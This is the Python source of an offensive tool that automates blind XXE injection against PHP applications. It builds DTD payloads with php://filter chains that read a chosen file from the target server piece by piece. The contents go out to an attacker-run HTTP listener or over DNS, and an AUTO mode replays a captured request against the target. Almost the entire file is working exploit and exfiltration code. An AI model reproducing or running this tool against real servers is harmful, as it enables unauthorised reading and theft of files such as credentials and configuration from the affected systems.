import argparse
import requests
import urllib3
import tempfile
import os
import re
from urllib.parse import urlparse

from libs.tampers import MultiTamper, ReplaceTamper, URLETamper, B64Tamper
from libs.server import start_server, SERVER_QUEUE
from libs.wrapwrap import WrapWrap
from libs.lightyear import Lightyear
from libs.output import LiveOutput

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DOCTYPE_PATTERN = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x SYSTEM "{SYSTEM_URL}" []><foo></foo>'
DTD_PATTERN = """<!ENTITY % data SYSTEM "{FC}">
<!ENTITY % exf %data;>
<!ENTITY % payload '<!ENTITY &#37; e SYSTEM "php://filter/resource={EXFILTRATE_URL}">'>
%payload;
%e;
"""

class Mode:
    def __init__(self, exfiltrate_url: str, dns_exf: bool, live: LiveOutput):
        self.exfiltrate_url = exfiltrate_url
        self.dns_exf = dns_exf
        self.live = live


class AutoMode(Mode):
    @classmethod
    def init_argparse(cls, subparser):
        parser = subparser.add_parser('AUTO')

        parser.add_argument('request_filename', 
                            help='the filename that contains the full http request')
        parser.add_argument('-u', '--target', 
                            required=True, 
                            help='the target URI if different from the host header in the request file')
        parser.add_argument('-x', '--proxy')

    def __init__(self, /, exfiltrate_url: str, dns_exf: bool, request_filename:str, live: LiveOutput, **kwargs):
        super().__init__(exfiltrate_url, dns_exf, live)
        self.req = self.parse_request(request_filename, kwargs.get('target'))
        self.kwargs = kwargs
        self.sess = requests.session()

        if kwargs.get('proxy'):
            self.sess.proxies.update({
                'http': kwargs['proxy'],
                'https': kwargs['proxy'],
            })

        o = urlparse(exfiltrate_url)
        if not o.port:
            if not dns_exf:
                exit('Exfiltration url must include port.')
        else:
            start_server(o.port)

    def send(self, payload: str) -> None:
        tamper = MultiTamper([
            ReplaceTamper('@payload', payload),
            URLETamper(),
            B64Tamper()
        ])

        url = tamper.handle(self.req.url)
        body = self.req.body
        if body:
            body = tamper.handle(body)

        r = self.sess.request(
            self.req.method,
            url,
            headers=self.req.headers, 
            data=body,
            verify=False,
        )
        self.live.print(f'[+] request sended, response code is {r.status_code}')

    def handle(self) -> None:
        if self.dns_exf:
            # @todo: not automated now
            self.live.stop()
            data = input('Enter recived data:')
            self.live.start()
        else:
            data = SERVER_QUEUE.get(True, timeout=120)
        return data

    def parse_request(self, filename: str, target_uri: str) -> requests.Request:
        req = requests.Request()
        with open(filename, 'r') as f:
            raw_headers, body = re.split('(?:\n\n|\r\r|\r\n\r\n)', f.read(), maxsplit=1)
            first_line, raw_headers = re.split('(?:\n|\r|\r\n)', raw_headers, maxsplit=1) 
            method, path, _ = first_line.split(' ', 2)

            headers = {}
            for header in re.split('(?:\n|\r|\r\n)', raw_headers):
                k, v = header.split(':', maxsplit=1)
                headers[k.strip().upper()] = v.strip()
                
            req.url = target_uri.rstrip('/') + path
            req.method = method
            req.headers = headers
            req.body = body
        return req


class ManualMode(Mode):
    @classmethod
    def init_argparse(cls, subparser):
        subparser.add_parser('MANUAL')

    def __init__(self, /, exfiltrate_url: str, dns_exf: bool, live: LiveOutput):
        super().__init__(exfiltrate_url, dns_exf, live)
    
    def send(self, payload: str) -> None:
        self.live.print(f'[+] Next chunk payload: \n{payload}\n')

    def handle(self) -> None:
        return input('Enter recived data:') 

class Main:
    def __init__(self, mode: Mode, filename: str, length: int, live: LiveOutput):
        self.mode = mode
        self.filename = filename
        self.length = length
        self.tmpfilename = tempfile.NamedTemporaryFile('wb', delete=False).name
        self.live = live

    def start(self, decode: bool):
        self.live.start()
        self._main_loop(decode)

    def _main_loop(self, decode: bool) -> None:
        mode = self.mode
        ww_fc = WrapWrap().generate(self.length)
        lightyear = Lightyear(self.length)

        while True:
            try:
                ly_fc = lightyear.fc()
                dtd = self.make_dtd_content(mode, f'php://filter/{ly_fc}/{ww_fc}/resource={self.filename}')
                self.live.print(f'[+] uncompressed payload size: {len(dtd)}')

                payload = self.make_doctype_payload(dtd)
                mode.send(payload)

                data = mode.handle()
                if not data:
                    self.live.print('[-] Data is empty, just finish')
                    break
                
                fixed_data = data.replace(' ', '+').replace('-', '') # fxied after REMOVE_EQUAL
                lightyear.update(fixed_data)
                self.live.print(f'[+] fetched: \n{lightyear.output(decode)}\n\n\n', flush=True)
                # @todo: better eof check
                if ' -AD0' in data:
                    break
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.live.stop()
                print('[Error] ' + str(e))
                break

    def make_dtd_content(self, mode: Mode, filter_chain: str) -> str:
        if not mode.dns_exf:
            url = mode.exfiltrate_url + '?exf=%exf;'
        else:
            o = urlparse(mode.exfiltrate_url)
            url = f"{o.scheme}://%exf;.{o.netloc}/"
        return DTD_PATTERN.format(FC=filter_chain, EXFILTRATE_URL=url)

    def make_doctype_payload(self, dtd:str) -> str:
        compressed = self.compress_payload(dtd)
        system_uri = f'php://filter/convert.base64-decode/zlib.inflate/resource=data:,{compressed}'
        return DOCTYPE_PATTERN.format(SYSTEM_URL=system_uri)

    def compress_payload(self, data: str) -> str:
        with open(self.tmpfilename, 'wb') as f:
            f.write(data.encode())

        # diff zlib php & python :'(
        php = f"echo file_get_contents('php://filter/zlib.deflate/convert.base64-encode/resource={self.tmpfilename}');"
        encoded = os.popen(f'php -r "{php}"', 'r')
        return encoded.read().replace('+', '%2b')
    
    def __del__(self):
        self.live.stop()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('exfiltrate_url')
    parser.add_argument('-f', '--filename', required=True,
                        help="the name of the file whose content we want to get")
    parser.add_argument('-l', '--length', type=int, default=18,
                        help='each request will retrieve l-bytes in b64. Increase this param will be huge increase payload size')
    parser.add_argument('--dns-exf', action=argparse.BooleanOptionalAction, default=False,
                        help='enable/disable exfiltration over DNS')
    parser.add_argument('--decode', action=argparse.BooleanOptionalAction, 
                        help='Inline decode to b64 in output')
    subparsers = parser.add_subparsers(required=True, dest='mode')
    
    AutoMode.init_argparse(subparsers)
    ManualMode.init_argparse(subparsers)

    args = vars(parser.parse_args())

    filename = args.pop('filename')
    length = args.pop('length')
    mode_name = args.pop('mode')
    decode = args.pop('decode')
    live_enabled = True # @todo: add flag
    # @todo: add output into file

    is_manual = mode_name == 'MANUAL'
    if is_manual:
        print('NOTICE: MANUAL has always ugly live')
        live_enabled = True

    mode_cls = ManualMode if is_manual else AutoMode
    live_output = LiveOutput(live_enabled, ugly=is_manual)
    mode = mode_cls(**args, live=live_output)

    Main(mode, filename, length, live_output).start(decode)